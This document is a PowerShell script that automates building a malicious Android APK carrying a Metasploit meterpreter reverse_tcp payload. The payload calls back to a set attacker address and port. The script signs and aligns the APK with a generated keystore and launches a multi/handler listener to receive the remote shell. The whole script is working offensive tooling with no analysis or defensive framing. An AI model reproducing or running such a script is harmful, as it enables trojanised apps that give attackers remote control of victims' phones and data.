# Define Variables
$LHOST = "192.168.1.100"  # Change to your local/public IP
$LPORT = "4444"           # Port to listen on
$payload = "android/meterpreter/reverse_tcp"
$apkOutput = "malicious.apk"
$signedApk = "signed-malicious.apk"
$finalApk = "final-malicious.apk"
$keystore = "my-release-key.jks"
$keyAlias = "my-key"
$ksPassword = "yourpassword"

# Check if msfvenom, keytool, apksigner, and msfconsole are available
$requiredTools = @("msfvenom", "msfconsole", "keytool", "apksigner", "zipalign")

foreach ($tool in $requiredTools) {
    if (!(Get-Command $tool -ErrorAction SilentlyContinue)) {
        Write-Host "ERROR: $tool is missing! Install Metasploit & Android SDK tools." -ForegroundColor Red
        Exit
    }
}

# Function to generate the malicious APK
function GeneratePayload {
    Write-Host "Generating malicious APK..." -ForegroundColor Yellow
    Start-Process -NoNewWindow -Wait -FilePath "msfvenom" -ArgumentList "-p $payload LHOST=$LHOST LPORT=$LPORT -o $apkOutput"
    Write-Host "APK Generated: $apkOutput" -ForegroundColor Green
}

# Function to generate a keystore (if missing)
function GenerateKeystore {
    if (!(Test-Path $keystore)) {
        Write-Host "Keystore not found! Generating a new one..." -ForegroundColor Yellow
        Start-Process -NoNewWindow -Wait -FilePath "keytool" -ArgumentList "-genkey -v -keystore $keystore -keyalg RSA -keysize 2048 -validity 10000 -alias $keyAlias -storepass $ksPassword -keypass $ksPassword"
        Write-Host "Keystore created: $keystore" -ForegroundColor Green
    } else {
        Write-Host "Keystore already exists. Skipping creation." -ForegroundColor Cyan
    }
}

# Function to sign the APK
function SignApk {
    Write-Host "Signing APK..." -ForegroundColor Yellow
    Start-Process -NoNewWindow -Wait -FilePath "apksigner" -ArgumentList "sign --ks $keystore --ks-key-alias $keyAlias --ks-pass pass:$ksPassword --out $signedApk $apkOutput"
    Write-Host "APK Signed: $signedApk" -ForegroundColor Green
}

# Function to align the APK
function AlignApk {
    Write-Host "Aligning APK..." -ForegroundColor Yellow
    Start-Process -NoNewWindow -Wait -FilePath "zipalign" -ArgumentList "-v 4 $signedApk $finalApk"
    Write-Host "APK Aligned: $finalApk" -ForegroundColor Green
}

# Function to start Metasploit listener
function StartListener {
    Write-Host "Starting Metasploit Listener..." -ForegroundColor Yellow
    $msfCommands = @"
use exploit/multi/handler
set payload $payload
set LHOST $LHOST
set LPORT $LPORT
exploit -j
"@
    $msfCommands | Out-File "msf_listener.rc"
    Start-Process -NoNewWindow -FilePath "msfconsole" -ArgumentList "-r msf_listener.rc"
}

# Run everything in a PowerShell job
$job = Start-Job -ScriptBlock {
    GeneratePayload
    GenerateKeystore
    SignApk
    AlignApk
    StartListener
}

Write-Host "Payload generation started in the background. Use 'Get-Job' to check progress." -ForegroundColor Cyan
Write-Host "Use 'Receive-Job -id $($job.Id)' to view output when done." -ForegroundColor Cyan
